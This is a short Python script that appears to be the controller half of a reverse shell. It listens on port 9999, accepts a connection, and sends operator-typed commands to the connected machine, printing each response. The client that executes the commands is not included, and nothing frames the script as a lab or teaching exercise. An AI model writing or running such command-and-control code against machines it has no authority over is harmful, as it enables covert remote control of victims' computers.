import socket
import sys

# creating the socket
def create_socket():
   try:
        global s
        global host     #host is the ip address
        global port
        host = ""
        port = 9999
        s = socket.socket()

   except socket.error as msg:
       print("socket creation error:",str(msg),"\ncound not create a socket")

# binding the port and putting the port to listen mode
def bind_socket():
    try:
        global host
        global port
        global s
        print("binding the port:"+ str(port))
        s.bind((host,port))
        s.listen(1)

    except socket.error as msg:
        print("socket binding error:",str(msg),"\n retrying.....")
        bind_socket()

# establishing connetion with the clients
def socket_accept():
    global conn
    global address
    conn,address = s.accept()
    print("connection has been established!!!!")
    print("IP: ",str(address[0]))
    print("port: ",str(address[1]))
    send_command()
    conn.close()

# send command to client
def send_command():
    while True:
        cmd= input(">>>")
        if cmd == "exit":
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8")
            print(client_response)

def main():
    create_socket()
    bind_socket()
    socket_accept()

main()
